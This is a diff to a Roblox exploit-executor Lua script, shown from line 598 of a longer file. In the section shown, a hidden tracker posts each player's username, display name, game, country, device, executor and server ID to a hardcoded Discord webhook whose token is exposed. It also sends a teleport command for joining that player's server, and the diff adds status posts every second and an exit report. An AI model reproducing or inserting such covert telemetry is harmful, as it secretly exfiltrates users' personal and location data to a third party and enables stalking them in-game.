@@ -598,27 +598,26 @@ local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 local TeleportService = game:GetService("TeleportService")
 local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
 
--- 🔗 Nhập Webhook của bạn
 local LinkWebHook = "https://discord.com/api/webhooks/1343591803101904916/z7lDVIhJDsOMx6JYeGHP039WD9R-RSsV6YMjYUDsES1MRdgDJfLv8bKJ1PQlnw6xk4LS"
 
--- 📌 Lấy ID Game & ID Server Hiện Tại
 local GameID = game.PlaceId
 local ServerID = game.JobId
 
--- 🕹️ Lấy thông tin game
+-- Lấy tên game
 local gameName = "Unknown"
 pcall(function()
     gameName = MarketplaceService:GetProductInfo(GameID).Name
 end)
 
--- 🖥️ Kiểm tra thiết bị (PC hay Mobile)
+-- Kiểm tra thiết bị
 local deviceType = "PC"
 if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
     deviceType = "Mobile"
 end
 
--- 🔎 Kiểm tra Executor đang chạy code
+-- Kiểm tra executor
 local executor = "Unknown"
 if syn then
     executor = "Synapse X"
@@ -633,78 +632,106 @@ elseif getexecutorname then
     end
 end
 
--- 🌍 Xác định quốc gia
+-- Quốc gia người chơi
 local locale = Players.LocalPlayer.LocaleId:lower()
 local country = "Không xác định"
-
-if string.find(locale, "vn") then
-    country = "Việt Nam"
-elseif string.find(locale, "th") then
-    country = "Thái Lan"
-elseif string.find(locale, "id") then
-    country = "Indonesia"
-elseif string.find(locale, "ph") then
-    country = "Philippines"
-elseif string.find(locale, "my") then
-    country = "Malaysia"
-elseif string.find(locale, "us") then
-    country = "Hoa Kỳ"
-elseif string.find(locale, "br") then
-    country = "Brazil"
-elseif string.find(locale, "kr") then
-    country = "Hàn Quốc"
-elseif string.find(locale, "jp") then
-    country = "Nhật Bản"
-elseif string.find(locale, "de") then
-    country = "Đức"
-elseif string.find(locale, "fr") then
-    country = "Pháp"
-elseif string.find(locale, "ru") then
-    country = "Nga"
+local countryMap = {
+    vn = "Việt Nam", th = "Thái Lan", id = "Indonesia", ph = "Philippines",
+    my = "Malaysia", us = "Hoa Kỳ", br = "Brazil", kr = "Hàn Quốc",
+    jp = "Nhật Bản", de = "Đức", fr = "Pháp", ru = "Nga"
+}
+for code, name in pairs(countryMap) do
+    if locale:find(code) then
+        country = name break
+    end
 end
 
--- 📋 Mã Teleport vào server hiện tại
+-- Quốc gia server dựa theo ping
+local serverLocation = "Không xác định"
+pcall(function()
+    local ping = tonumber(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString():gsub(" ms", ""))
+    if ping then
+        if ping <= 80 then
+            serverLocation = "🇸🇬 Singapore"
+        elseif ping <= 150 then
+            serverLocation = "🇭🇰 Hong Kong / 🇵🇭 Philippines"
+        elseif ping <= 200 then
+            serverLocation = "🇯🇵 Japan / 🇰🇷 Korea"
+        elseif ping <= 300 then
+            serverLocation = "🇺🇸 US West"
+        else
+            serverLocation = "🌍 Xa hoặc không rõ"
+        end
+    end
+end)
+
+-- Loại server
+local serverType = game.PrivateServerId ~= "" and not game.PrivateServerOwnerId == 0 and "🔒 Private Server" or "🌐 Public Server"
+
+-- Mã teleport
 local teleportCode = string.format(
     'game:GetService("TeleportService"):TeleportToPlaceInstance("%s", "%s", game.Players.LocalPlayer)', 
     GameID, ServerID
 )
 
--- 📤 Gửi Webhook
-local function sendWebhook(title, message)
+-- Gửi webhook
+local function sendWebhook(title, message, id)
     local data = {
         ["username"] = "NomDom Notifier",
-        ["embeds"] = {
-            {
-                ["title"] = title,
-                ["description"] = message,
-                ["color"] = tonumber(0x310a4c),
-                ["footer"] = {["text"] = "Sent from NomDom Notifier"}
-            }
-        }
+        ["embeds"] = {{
+            ["title"] = title,
+            ["description"] = message,
+            ["color"] = tonumber(0x310a4c),
+            ["footer"] = {["text"] = "Sent from NomDom Notifier"}
+        }]
     }
-    local jsonData = HttpService:JSONEncode(data)
 
+    if id then data["message_id"] = id end
+
+    local jsonData = HttpService:JSONEncode(data)
+    local response
     pcall(function()
-        (syn and syn.request or request)({
+        response = (syn and syn.request or request)({
             Url = LinkWebHook,
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
             Body = jsonData
         })
     end)
+    return response
 end
 
--- 📌 Gửi thông tin server khi vào game
+-- Gửi thông tin lần đầu
 local username = Players.LocalPlayer.Name
 local displayName = Players.LocalPlayer.DisplayName
+local initialMsg = "**👤 Người chơi:** " .. username .. " (Tên giả: " .. displayName .. ")" ..
+"\n**🎮 Game:** " .. gameName ..
+"\n**🌐 Quốc gia người chơi:** " .. country ..
+"\n**📡 Quốc gia server:** " .. serverLocation ..
+"\n**💻 Thiết bị:** " .. deviceType ..
+"\n**🧪 Executor:** " .. executor ..
+"\n**🛠️ Loại server:** " .. serverType ..
+"\n**🆔 Place ID:** " .. GameID ..
+"\n**🧾 Server ID:** `" .. ServerID .. "`" ..
+"\n\n**📋 Mã Teleport:** ```lua\n" .. teleportCode .. "\n```"
 
-sendWebhook("Notifer Xem mấy thk skid dùng script",
-    "** Người chơi:** " .. username .. " (Tên giả: " .. displayName .. ")" ..
-    "\n** Game:** " .. gameName ..
-    "\n** Quốc gia:** " .. country ..
-    "\n** Thiết bị:** " .. deviceType ..
-    "\n** Executor:** " .. executor ..
-    "\n** Place ID:** " .. GameID ..
-    "\n** Server ID:** `" .. ServerID .. "`" ..
-    "\n\n** Mã Teleport:** ```lua\n" .. teleportCode .. "\n```"
-)
+sendWebhook("📌 Đã vào game", initialMsg)
+
+-- Cập nhật trạng thái mỗi 1 giây
+local secondsPassed = 0
+local scriptRunning = true
+
+task.spawn(function()
+    while scriptRunning do
+        secondsPassed += 1
+        local msg = string.format("🟢 Script vẫn đang hoạt động - Đã chạy %d giây", secondsPassed)
+        sendWebhook("⏱️ Trạng thái script", msg)
+        task.wait(1)
+    end
+end)
+
+-- Tự động báo dừng nếu thoát hoặc lỗi
+game:BindToClose(function()
+    scriptRunning = false
+    sendWebhook("🔴 Script đã dừng hoạt động (thoát game hoặc lỗi)", "")
+end)
